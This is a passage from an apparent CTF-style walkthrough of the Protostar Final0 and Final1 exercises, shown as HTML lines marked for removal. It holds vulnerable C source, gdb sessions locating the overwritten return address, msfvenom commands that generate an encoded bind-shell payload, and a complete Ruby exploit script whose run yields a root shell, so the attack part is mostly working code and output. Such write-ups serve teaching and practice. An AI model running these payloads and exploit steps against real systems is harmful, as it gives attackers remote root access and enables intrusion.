-</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
-</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Strip off trailing new line characters */</span>
-</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Convert to lower case */</span>
-</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Duplicate the string and return it */</span>
-</span><span class='line'>  <span class="k">return</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
-</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
-</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
-</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">username</span> <span class="o">=</span> <span class="n">get_username</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;No such user %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We attach to the process as root to find the offset with stored EIP.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># window1:
-</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -p 27474
-</span><span class='line'>Attaching to process 27474
-</span><span class='line'>...
-</span><span class='line'>gdb> c
-</span><span class='line'>[New process 27485]
-</span><span class='line'>
-</span><span class='line'># window2:
-</span><span class='line'>user@protostar:/tmp$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2A" | nc 0 2995
-</span><span class='line'>
-</span><span class='line'># window1:
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>[Switching to process 27485]
-</span><span class='line'>_______________________________________________________________________________
-</span><span class='line'>     eax:0804B008 ebx:35724134  ecx:00000000  edx:00000001     eflags:00010286
-</span><span class='line'>     esi:00000000 edi:00000000  esp:BFFFF780  ebp:41367241     eip:72413772
-</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
-</span><span class='line'>[007B:BFFFF780]---------------------------------------------------------[stack]
-</span><span class='line'>BFFFF7B0 : 01 00 00 00  54 F8 FF BF - 5C F8 FF BF  48 18 FE B7 ....T...\...H...
-</span><span class='line'>BFFFF7A0 : B0 98 04 08  00 00 00 00 - 28 F8 FF BF  76 DC EA B7 ........(...v...
-</span><span class='line'>BFFFF790 : 65 63 EC B7  40 10 FF B7 - 04 00 00 00  F4 7F FD B7 ec..@...........
-</span><span class='line'>BFFFF780 : 38 41 72 39  41 73 30 41 - 73 31 41 73  32 41 00 BF 8Ar9As0As1As2A..
-</span><span class='line'>[007B:0804B008]---------------------------------------------------------[ data]
-</span><span class='line'>0804B008 : 41 41 30 41  41 31 41 41 - 32 41 41 33  41 41 34 41 AA0AA1AA2AA3AA4A
-</span><span class='line'>0804B018 : 41 35 41 41  36 41 41 37 - 41 41 38 41  41 39 41 42 A5AA6AA7AA8AA9AB
-</span><span class='line'>[0073:72413772]---------------------------------------------------------[ code]
-</span><span class='line'>0x72413772:   Error while running hook_stop:
-</span><span class='line'>Cannot access memory at address 0x72413772
-</span><span class='line'>0x72413772 in ?? ()
-</span><span class='line'>
-</span><span class='line'># window2:
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x72413772
-</span><span class='line'>[*] Exact match at offset 532
-</span><span class='line'>
-</span><span class='line'># window1:
-</span><span class='line'>gdb> i r
-</span><span class='line'>eax            0x804b008  0x804b008
-</span><span class='line'>ecx            0x0    0x0
-</span><span class='line'>edx            0x1    0x1
-</span><span class='line'>ebx            0x35724134 0x35724134
-</span><span class='line'>esp            0xbffff780 0xbffff780
-</span><span class='line'>ebp            0x41367241 0x41367241
-</span><span class='line'>esi            0x0    0x0
-</span><span class='line'>edi            0x0    0x0
-</span><span class='line'>eip            0x72413772 0x72413772
-</span><span class='line'>eflags         0x10286    [ PF SF IF RF ]
-</span><span class='line'>cs             0x73   0x73
-</span><span class='line'>ss             0x7b   0x7b
-</span><span class='line'>ds             0x7b   0x7b
-</span><span class='line'>es             0x7b   0x7b
-</span><span class='line'>fs             0x0    0x0
-</span><span class='line'>gs             0x33   0x33
-</span><span class='line'>
-</span><span class='line'>gdb> x /x 0x804b008
-</span><span class='line'>0x804b008:    0x41304141
-</span><span class='line'>gdb> x /s 0x804b008
-</span><span class='line'>0x804b008:     "AA0AA1AA2AA3AA4AA5AA6AA7AA8AA9AB0AB1AB2AB3AB4AB5AB6AB7AB8AB9AC0AC1AC2AC3AC4AC5AC6AC7AC8AC9AD0AD1AD2AD3AD4AD5AD6AD7AD8AD9AE0AE1AE2AE3AE4AE5AE6AE7AE8AE9AF0AF1AF2AF3AF4AF5AF6AF7AF8AF9AG0AG1AG2AG3AG4AG5AG"...</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So EAX points at the beginning to the buffer and we are lucky, because there is also <code>call eax</code> in binary.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j eax final0
-</span><span class='line'>[final0]
-</span><span class='line'>0x08048d5f call eax
-</span><span class='line'>0x0804992b call eax
-</span><span class='line'>0x08054f4b call eax
-</span><span class='line'>0x08054f4b call eax</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We use <code>msfvenom</code> to generate bind shell, port <code>2449</code>, without newline characters and with uppercase encoding:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b '\x0a\x0d'
-</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
-</span><span class='line'>Found 1 compatible encoders
-</span><span class='line'>Attempting to encode payload with 1 iterations of x86/alpha_upper
-</span><span class='line'>x86/alpha_upper succeeded with size 224 (iteration=0)
-</span><span class='line'>Payload size: 224 bytes
-</span><span class='line'>???t$?[SYIIICCCCCCCQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIFQYKL7JCQCQS1CSZTBK9KQNPCV8MK01K1N1B3XC2C0C9LQ2J4PF160K9KQCZ560X8MK0K91QTDH3DDX02F8MK0PC80RFHMMPZ3V9RJWOV8HMK0PIT9KHCX6OVOT3RHRHVOCRU9BNMYM30PPSLIKQNPDKXMK0AA</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The lower case <code>t</code> at the beginning of the payload is used in order to find the payload&rsquo;s absolute location in memory and obtain a position-independent shellcode,
-more <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">here</a>.</p>
-
-<p>Because we can refer to this position also with the register <code>eax</code>, we can get rid of lower case character:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b '\x0a\x0d' BufferRegister=EAX
-</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
-</span><span class='line'>Found 1 compatible encoders
-</span><span class='line'>Attempting to encode payload with 1 iterations of x86/alpha_upper
-</span><span class='line'>x86/alpha_upper succeeded with size 217 (iteration=0)
-</span><span class='line'>Payload size: 217 bytes
-</span><span class='line'>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIVQIKJWZC0SQS0S3Z4BK9M1X0CVHMMP1KQN1B3XER5P39J1RJTPV10PLIM1SZCVV88MMPMYW1S4H3ETH0BFHMMPPCNP3VHMK0MC69SZ7OF8XMMPW9BYKHSXFOFOSCSX3X6O52RI2NK9ZC0P63MYM1X04K8MMPAA</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Exploit:</p>
-
-<figure class='code'><figcaption><span>language:ruby exploit-final0.rb </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j eax final0 </span>
-</span><span class='line'><span class="c1">#[final0]</span>
-</span><span class='line'><span class="c1">#0x08048d5f call eax</span>
-</span><span class='line'><span class="c1">#0x0804992b call eax</span>
-</span><span class='line'><span class="c1">#0x08054f4b call eax</span>
-</span><span class='line'><span class="c1">#0x08054f4b call eax</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x72413772</span>
-</span><span class='line'><span class="c1">#[*] Exact match at offset 532</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &#39;\x0a\x0d&#39; BufferRegister=EAX -f ruby</span>
-</span><span class='line'><span class="n">buf</span> <span class="o">=</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x4a\x4a\x49\x36\x51\x49\x4b\x4c\x37\x4a\x43\x36\x33\x50</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x43\x56\x33\x43\x5a\x53\x32\x4d\x59\x4d\x31\x48\x30\x33</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x56\x58\x4d\x4d\x50\x31\x4b\x31\x4e\x31\x42\x42\x48\x54</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x42\x35\x50\x53\x39\x4a\x31\x32\x4a\x32\x30\x46\x31\x56</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x30\x4c\x49\x4d\x31\x52\x4a\x42\x46\x30\x58\x58\x4d\x4b</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x30\x4d\x59\x31\x51\x44\x44\x38\x33\x55\x54\x4e\x50\x32</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x46\x38\x4d\x4d\x50\x30\x43\x4e\x50\x45\x36\x38\x4d\x4b</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x30\x5a\x33\x36\x39\x53\x5a\x47\x4f\x50\x58\x48\x4d\x4b</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x30\x31\x59\x32\x59\x4a\x58\x45\x38\x36\x4f\x56\x4f\x32</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x53\x53\x58\x35\x38\x46\x4f\x45\x32\x53\x59\x32\x4e\x4d</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x59\x4a\x43\x36\x30\x56\x33\x4b\x39\x4d\x31\x58\x30\x44</span><span class="s2">&quot;</span> <span class="o">+</span>
-</span><span class='line'><span class="s2">&quot;</span><span class="se">\x4b\x58\x4d\x4b\x30\x41\x41</span><span class="s2">&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">532</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span>
-</span><span class='line'><span class="n">exploit</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x08048d5f</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
-</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="s2">&quot;192.168.80.154&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">2995</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ./exploit-final0.rb 
-</span><span class='line'>Using host: 192.168.80.154
-</span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ nc 0 2449
-</span><span class='line'>id
-</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Protostar Final1</h2>
-
-<figure class='code'><figcaption><span>final1.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#include &lt;syslog.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#define NAME &quot;final1&quot;</span>
-</span><span class='line'><span class="cp">#define UID 0</span>
-</span><span class='line'><span class="cp">#define GID 0</span>
-</span><span class='line'><span class="cp">#define PORT 2994</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-</span><span class='line'><span class="kt">char</span> <span class="n">hostname</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="nf">logit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">pw</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">&quot;Login from %s as [%s] with password [%s]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">pw</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">syslog</span><span class="p">(</span><span class="n">LOG_USER</span><span class="o">|</span><span class="n">LOG_DEBUG</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="nf">trim</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="nf">parser</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[final1] $ &quot;</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">))</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">trim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
-</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;username &quot;</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>          <span class="n">strcpy</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">line</span><span class="o">+</span><span class="mi">9</span><span class="p">);</span>
